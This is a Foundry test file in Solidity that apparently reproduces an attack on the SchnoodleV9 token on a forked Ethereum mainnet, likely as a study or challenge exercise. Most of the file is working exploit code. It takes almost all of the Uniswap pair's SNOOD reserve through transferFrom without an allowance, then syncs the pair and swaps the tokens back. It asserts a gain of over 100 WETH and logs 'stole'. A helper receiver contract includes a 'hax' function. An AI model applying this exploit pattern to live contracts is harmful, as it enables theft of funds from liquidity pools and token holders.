// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/SchnoodleV9.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/interfaces/IWETH9.sol";

import "../src/utils/introspection/IERC1820RegistryUpgradeable.sol";

contract ERC777Receiver is Test {
    IERC1820RegistryUpgradeable internal constant reg = IERC1820RegistryUpgradeable(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant hash = keccak256("ERC777TokensRecipient");
    
    SchnoodleV9 snood = SchnoodleV9(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
    constructor() {
        reg.setInterfaceImplementer(
            address(0),
            hash,
            address(0)
        );
    }
    
    function hax() public {
        weth.deposit{value: 1000 wei}();
        weth.transfer(address(uniswap), 1000);
        uniswap.swap(0, 10000, address(this), "");
        emit log("swapped");
    }
    
    function tokensReceived(
        address operator, 
        address from, 
        address to, 
        uint256 amount,
        bytes memory userData,    
        bytes memory operatorData,
        bool requireReceptionAck
    ) public {
        if (msg.sender == 0xD45740aB9ec920bEdBD9BAb2E863519E59731941) {
            emit log("called!");
        }
    }
}

contract SchnoodleHack is Test {
    SchnoodleV9 snood = SchnoodleV9(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IUniswapV2Pair uniswap = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);
    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testSchnoodleHack() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
        console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));
        
        // INSERT EXPLOIT HERE
        
        (uint256 r0, uint256 r1, ) = uniswap.getReserves();
        emit log_named_uint("r0", r0);
        emit log_named_uint("r1", r1);
        
        snood.transferFrom(address(uniswap), address(this), r1 - 1);
        assertEq(snood.balanceOf(address(this)), r1 - 1);
        emit log("stole");
        uniswap.sync();
        snood.transfer(address(uniswap), r1 - 1);
        (uint256 nr0, uint256 nr1,) = uniswap.getReserves();
        uniswap.swap(getAmountOut(r1 - 1, nr1, nr0), 0, address(this), "");

        console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
        assertGt(weth.balanceOf(address(this)), 100 ether);
    }
    
    // from uniswap library
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }
}
